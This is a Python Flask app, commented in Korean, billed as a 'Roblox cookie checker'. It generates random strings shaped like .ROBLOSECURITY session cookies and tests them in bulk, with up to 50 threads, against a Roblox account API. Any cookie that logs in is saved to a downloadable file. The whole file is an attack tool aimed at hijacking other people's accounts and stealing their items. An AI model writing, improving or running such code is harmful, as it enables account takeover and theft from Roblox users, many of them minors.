import os
import random
import string
import threading
from queue import Queue
import requests
import time
from flask import Flask, jsonify, send_file

app = Flask(__name__)

# 상수 설정
INTRO = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
LETTERS = 'ABCDEF'
URL = 'https://accountinformation.roblox.com/v1/birthdate'

# 전역 변수
cookie_queue = Queue()
print_lock = threading.Lock()
valid_cookies = []  # 로그인 성공한 쿠키들 저장

def generate_cookie():
    """랜덤 쿠키 생성"""
    return INTRO + ''.join(random.choices(LETTERS + string.digits, k=732))

def check_login(cookie):
    """쿠키로 로그인 성공 여부 확인"""
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        response = requests.get(URL, headers=headers, timeout=5)
        
        if response.status_code == 200:
            with print_lock:
                print(f"[로그인 성공] {cookie[:50]}...")
            return True
            
        else:
            with print_lock:
                print(f"[로그인 실패] 상태 코드: {response.status_code}")
            return False
            
    except Exception as e:
        with print_lock:
            print(f"[오류] {str(e)}")
        return False

def worker():
    """워커 스레드 함수"""
    while True:
        cookie = cookie_queue.get()
        if cookie is None:  # 종료 신호
            break
            
        if check_login(cookie):
            with print_lock:
                valid_cookies.append(cookie)
                
        # 서버 부하 방지 딜레이
        time.sleep(random.uniform(0.5, 1.5))
        cookie_queue.task_done()

@app.route('/')
def index():
    """메인 페이지"""
    return """
    <h1>로블록스 쿠키 체커</h1>
    <p>개발 xdayoungx | https://discord.gg/x7EnRjRAP4</p>
    <p>명령어 사용법:</p>
    <ul>
        <li>/쿠키/[개수] - 쿠키 생성, 체크 후 파일로 다운로드</li>
    </ul>
    """

@app.route('/쿠키/<int:num_cookies>')
def all_in_one(num_cookies):
    """한번에 쿠키 생성, 체크, 파일 다운로드까지"""
    global valid_cookies
    valid_cookies = []
    
    if num_cookies <= 0 or num_cookies > 10000:
        return jsonify({"error": "쿠키 개수는 1~10000 사이여야 합니다"}), 400
    
    # 스레드 수 자동 조절 (최대 50개)
    num_threads = min(50, max(5, num_cookies // 20))
    
    print(f"시작: 쿠키 {num_cookies}개 생성 및 스레드 {num_threads}개 사용")
    
    # 쿠키 생성 및 큐에 추가
    for _ in range(num_cookies):
        cookie_queue.put(generate_cookie())
    
    # 스레드 시작
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # 모든 작업 완료 대기
    cookie_queue.join()
    
    # 모든 워커 스레드에 종료 신호
    for _ in range(num_threads):
        cookie_queue.put(None)
    
    for t in threads:
        t.join()
    
    # 결과 저장
    filename = f"roblox_cookies_{random.randint(1000, 9999)}.txt"
    
    with open(filename, 'w') as f:
        if valid_cookies:
            f.write("=== 로그인 성공 쿠키 ===\n\n")
            for cookie in valid_cookies:
                f.write(f"{cookie}\n\n")
            f.write(f"\n총 {len(valid_cookies)}개의 유효한 쿠키를 찾았습니다.\n")
        else:
            f.write("유효한 쿠키를 찾지 못했습니다.\n")
    
    print(f"체크 완료! {len(valid_cookies)}개의 유효한 쿠키를 찾았습니다.")
    
    # 파일 다운로드 제공
    return send_file(filename, as_attachment=True, download_name="roblox_cookies.txt")

# 서버 실행
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
